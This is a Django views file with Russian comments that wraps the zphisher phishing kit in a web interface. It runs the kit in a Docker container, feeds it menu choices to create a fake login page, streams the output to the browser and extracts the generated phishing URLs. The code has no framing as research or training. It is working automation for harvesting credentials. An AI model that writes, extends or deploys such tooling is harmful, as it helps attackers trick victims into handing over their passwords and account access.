
import subprocess
import time
from django.http import HttpResponse
from django.shortcuts import render

def show_zphisher_page(request):
    return render(request, 'zphisher.html')

def run_zphisher(request):
    def generate_output():
        try:
            # Логируем запуск команды
            print("Running zphisher command...")

            # Команда, которую вы хотите выполнить
            command = 'docker exec -it tender_heisenberg bash -c "echo -e \\"1\\n1\\n2\\" | /zphisher/zphisher.sh --create-fake-login"'
            process = subprocess.Popen(
                command, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True
            )

            # Логируем начало процесса
            print("Process started, waiting for output...")

            output = ""
            for line in process.stdout:
                # Логируем каждую строку вывода
                print(f"stdout: {line}")
                output += line
                yield f"data: {line}\n\n"
                time.sleep(0.1)  # Задержка

            # Извлекаем URL из вывода
            urls = extract_urls_from_output(output)
            if urls:
                yield f"data: {urls}\n\n"

            # Логируем завершение процесса
            print("Process finished")
            process.stdout.close()
            process.wait()

        except Exception as e:
            # Логируем ошибку
            print(f"Error: {str(e)}")
            yield f"data: Error: {str(e)}\n\n"

    return HttpResponse(generate_output(), content_type='text/event-stream')


import re

def extract_urls_from_output(output):
    # Регулярное выражение для поиска URL
    url_pattern = r'https?://[^\s]+'
    urls = re.findall(url_pattern, output)
    return "\n".join(f"URL {i+1} : {url}" for i, url in enumerate(urls)) if urls else "No URLs found"

